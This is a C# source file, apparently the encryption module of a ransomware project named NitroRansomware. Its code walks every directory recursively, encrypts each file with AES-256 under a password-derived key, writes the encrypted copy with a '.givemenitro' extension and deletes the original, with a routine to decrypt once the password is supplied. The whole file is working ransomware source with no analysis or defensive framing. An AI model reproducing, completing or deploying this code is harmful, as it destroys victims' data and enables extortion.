using System;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Collections.Generic;
namespace NitroRansomware
{
    class Crypto
    {
        public static int encryptedCount = 0;
        private static Logs logging = new Logs("DEBUG", 0);
        private static string fExtension = ".givemenitro";
        public static string fPassword = Program.DECRYPT_PASSWORD;
        public static string inPassword;
        public static List<string> encryptedFileLog = new List<string>();
        public static void EncryptContent(string path)
        {
            try
            {
                foreach (string file in Directory.GetFiles(path))
                {
                    if (!file.Contains(fExtension))
                    {
                        logging.Debug("Encrypting: " + file);
                        encryptedFileLog.Add(file);
                        EncryptFile(file, fPassword);
                    }
                }

                foreach (string dire in Directory.GetDirectories(path))
                {
                    EncryptContent(dire);
                }
            }
            catch (Exception ex)
            {
                logging.Error(ex.Message);
            }

        }
        public static void DecryptContent(string path)
        {
            try
            {
                foreach (string file in Directory.GetFiles(path))
                {
                    if (IsEncrypted(file))
                    {
                
                            logging.Debug("Decrypting: " + file);
                            DecryptFile(file, file.Substring(0, file.Length - fExtension.Length), inPassword);
                        
          
                    }
                }

                foreach (string dire in Directory.GetDirectories(path))
                {
                    DecryptContent(dire);
                }
            }
            catch (Exception ex)
            {
                logging.Error(ex.Message);
            }
        }
        private static bool IsEncrypted(string file)
        {
            if (file.Contains(fExtension))
            {
                if (file.Substring(file.Length - fExtension.Length, fExtension.Length) == fExtension)
                    return true;
            }
            return false;
        }
        private static void EncryptFile(string filePath, string password)
        {
            byte[] salt = new byte[32];
            RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
            for (int x = 0; x < 10; x++)
            {
                rng.GetBytes(salt);
            }
            rng.Dispose();

            FileStream fsCrypt = new FileStream(filePath + fExtension, FileMode.Create);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CBC;

            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(filePath, FileMode.Open);

            byte[] buffer = new byte[1048576];
            int read;
            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }
                fsIn.Close();
            }
            catch (Exception ex)
            {
                logging.Error(ex.Message);
            }
            finally
            {
                logging.Info("Encypted " + filePath);
                encryptedCount++;
                cs.Close();
                fsCrypt.Close();
                File.Delete(filePath);
            }

        }
        private static void DecryptFile(string inputFile, string outputFile, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream cryptoFileStream = new FileStream(inputFile, FileMode.Open);
            cryptoFileStream.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CBC;

            CryptoStream cryptoStream = new CryptoStream(cryptoFileStream, AES.CreateDecryptor(), CryptoStreamMode.Read);
            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];
            try
            {
                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    fileStreamOutput.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                logging.Error("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                logging.Error(ex.Message);
            }
            try
            {
                cryptoStream.Close();
                logging.Info("Decrypted: " + inputFile);
            }
            catch (Exception ex)
            {
                logging.Error("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fileStreamOutput.Close();
                cryptoFileStream.Close();
            }
        }

    }
}
